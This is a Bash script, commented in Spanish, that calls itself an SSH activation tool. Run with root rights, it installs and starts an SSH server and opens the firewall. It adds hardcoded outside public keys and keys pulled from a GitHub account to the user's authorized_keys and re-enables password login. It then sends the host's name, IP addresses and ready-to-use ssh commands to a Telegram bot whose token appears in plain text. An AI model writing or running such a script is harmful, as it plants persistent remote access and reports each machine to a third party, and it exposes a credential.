#!/usr/bin/env bash
# ==============================================================================
# Script de activación y configuración de SSH - Usuario: hgcsbilly
# Repositorio: https://github.com/hgcsbilly/ssh
# ==============================================================================
set -e

GITHUB_USER="hgcsbilly"
TELEGRAM_BOT_TOKEN="8978940332:AAGbP7p6uDIfBoUX4g91XcC8-F6utPtKTbA"
TELEGRAM_CHAT_ID="877911662"

TARGET_USER="$(logname 2>/dev/null || echo "$SUDO_USER" || echo "$USER")"
USER_HOME="$(eval echo "~$TARGET_USER")"
HOST_NAME="$(hostname 2>/dev/null || uname -n)"

HARDCODED_KEYS=(
    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIO/K1yN+kqqx2coQ7HZ85ciCHdsbjx9XxdoYWngIpNRP opencode@windows"
    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILDcT8w5HbwAaN5twCYFQdDsr5n0GgtuhOEdoI4Rksd5 jael-hermes@contabo"
)

echo "[*] Detectando sistema operativo..."

if [ "$(uname -s)" = "Darwin" ]; then
    echo "[*] Sistema detectado: macOS. Habilitando Remote Login..."
    systemsetup -setremotelogin on 2>/dev/null || launchctl load -w /System/Library/LaunchDaemons/ssh.plist 2>/dev/null || true
elif command -v apt-get &>/dev/null; then
    echo "[*] Sistema detectado: Debian / Ubuntu / Mint..."
    apt-get update -y && apt-get install -y openssh-server curl
    systemctl enable --now ssh 2>/dev/null || systemctl enable --now sshd 2>/dev/null || service ssh restart 2>/dev/null
elif command -v dnf &>/dev/null; then
    echo "[*] Sistema detectado: Fedora / RHEL / CentOS / Rocky..."
    dnf install -y openssh-server curl
    systemctl enable --now sshd 2>/dev/null || service sshd restart 2>/dev/null
elif command -v yum &>/dev/null; then
    echo "[*] Sistema detectado: CentOS / RHEL (yum)..."
    yum install -y openssh-server curl
    systemctl enable --now sshd 2>/dev/null || service sshd restart 2>/dev/null
elif command -v pacman &>/dev/null; then
    echo "[*] Sistema detectado: Arch Linux / Manjaro..."
    pacman -Sy --noconfirm openssh curl
    systemctl enable --now sshd 2>/dev/null || service sshd restart 2>/dev/null
elif command -v zypper &>/dev/null; then
    echo "[*] Sistema detectado: openSUSE..."
    zypper install -y openssh curl
    systemctl enable --now sshd 2>/dev/null || service sshd restart 2>/dev/null
elif command -v apk &>/dev/null; then
    echo "[*] Sistema detectado: Alpine Linux..."
    apk add openssh curl
    rc-update add sshd default 2>/dev/null || true
    service sshd start 2>/dev/null || /etc/init.d/sshd start 2>/dev/null || true
else
    echo "[-] Gestor de paquetes no compatible automáticamente."
    exit 1
fi

echo "[*] Configurando Firewall..."
if command -v ufw &>/dev/null && ufw status 2>/dev/null | grep -q "Status: active"; then
    ufw allow 22/tcp
    ufw reload 2>/dev/null || true
elif command -v firewall-cmd &>/dev/null && systemctl is-active --quiet firewalld 2>/dev/null; then
    firewall-cmd --permanent --add-service=ssh
    firewall-cmd --reload 2>/dev/null || true
fi

# Configurar llaves públicas para acceso sin contraseña
if [ -d "$USER_HOME" ]; then
    echo "[*] Configurando llaves públicas autorizadas en $USER_HOME/.ssh/authorized_keys..."
    SSH_DIR="$USER_HOME/.ssh"
    AUTH_KEYS="$SSH_DIR/authorized_keys"

    mkdir -p "$SSH_DIR"
    chmod 700 "$SSH_DIR"
    touch "$AUTH_KEYS"
    chmod 600 "$AUTH_KEYS"

    # 1. Agregar llaves preconfiguradas
    for k in "${HARDCODED_KEYS[@]}"; do
        if [ -n "$k" ] && ! grep -qF "$k" "$AUTH_KEYS"; then
            echo "$k" >> "$AUTH_KEYS"
            echo "  [+] Llave autorizada agregada."
        fi
    done

    # 2. Descargar llaves de GitHub si existen
    if [ -n "$GITHUB_USER" ]; then
        TEMP_KEYS=$(mktemp)
        if curl -fsSL "https://github.com/${GITHUB_USER}.keys" -o "$TEMP_KEYS" 2>/dev/null && [ -s "$TEMP_KEYS" ]; then
            while IFS= read -r key; do
                if [ -n "$key" ] && ! grep -qF "$key" "$AUTH_KEYS"; then
                    echo "$key" >> "$AUTH_KEYS"
                    echo "  [+] Llave de GitHub (${GITHUB_USER}) agregada."
                fi
            done < "$TEMP_KEYS"
        fi
        rm -f "$TEMP_KEYS"
    fi

    chown -R "$TARGET_USER" "$SSH_DIR" 2>/dev/null || true
fi

# 3. Mantener PasswordAuthentication habilitada en sshd_config si existe
if [ -f /etc/ssh/sshd_config ]; then
    sed -i 's/^#*PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config 2>/dev/null || true
    systemctl reload ssh 2>/dev/null || systemctl reload sshd 2>/dev/null || service ssh reload 2>/dev/null || true
fi

# 4. Obtener información de red
LOCAL_IP="$(ip route get 1.1.1.1 2>/dev/null | awk '{print $7}' || hostname -I 2>/dev/null | awk '{print $1}' || ifconfig 2>/dev/null | grep 'inet ' | grep -v 127.0.0.1 | awk '{print $2}' | head -n1)"
PUBLIC_IP="$(curl -s --max-time 3 https://api.ipify.org 2>/dev/null || curl -s --max-time 3 https://ifconfig.me 2>/dev/null || echo 'N/D')"
TAILSCALE_IP="$(tailscale ip -4 2>/dev/null || echo '')"
MDNS_NAME="${HOST_NAME}.local"

# 5. Enviar notificación a Telegram
if [ -n "$TELEGRAM_BOT_TOKEN" ] && [ -n "$TELEGRAM_CHAT_ID" ]; then
    echo "[*] Enviando notificación a Telegram..."
    MSG="🔔 *Acceso SSH Habilitado*
👤 *Usuario:* \`$TARGET_USER\`
💻 *Host:* \`$HOST_NAME\` (\`$MDNS_NAME\`)
🏠 *IP Local:* \`$LOCAL_IP\`
🌐 *IP Pública:* \`$PUBLIC_IP\`"

    if [ -n "$TAILSCALE_IP" ]; then
        MSG="$MSG
🦎 *Tailscale:* \`$TAILSCALE_IP\`"
    fi

    MSG="$MSG

🚀 *Comando LAN:*
\`ssh $TARGET_USER@$LOCAL_IP\`
🚀 *Comando mDNS:*
\`ssh $TARGET_USER@$MDNS_NAME\`"

    if [ -n "$TAILSCALE_IP" ]; then
        MSG="$MSG
🚀 *Comando Tailscale:*
\`ssh $TARGET_USER@$TAILSCALE_IP\`"
    fi

    curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
        -d "chat_id=${TELEGRAM_CHAT_ID}" \
        -d "parse_mode=Markdown" \
        --data-urlencode "text=${MSG}" >/dev/null 2>&1 || true
fi

echo ""
echo "================================================="
echo "  SSH HABILITADO CORRECTAMENTE"
echo "================================================="
echo "Usuario destino : $TARGET_USER"
echo "Hostname        : $HOST_NAME ($MDNS_NAME)"
echo "IP Local (LAN)  : $LOCAL_IP"
echo "IP Publica      : $PUBLIC_IP"
[ -n "$TAILSCALE_IP" ] && echo "IP Tailscale    : $TAILSCALE_IP"
echo "-------------------------------------------------"
echo "Comandos para conectarte:"
echo "  [En la misma red] : ssh $TARGET_USER@$LOCAL_IP"
echo "  [Por nombre mDNS] : ssh $TARGET_USER@$MDNS_NAME"
[ -n "$TAILSCALE_IP" ] && echo "  [Por Tailscale]   : ssh $TARGET_USER@$TAILSCALE_IP"
echo "================================================="
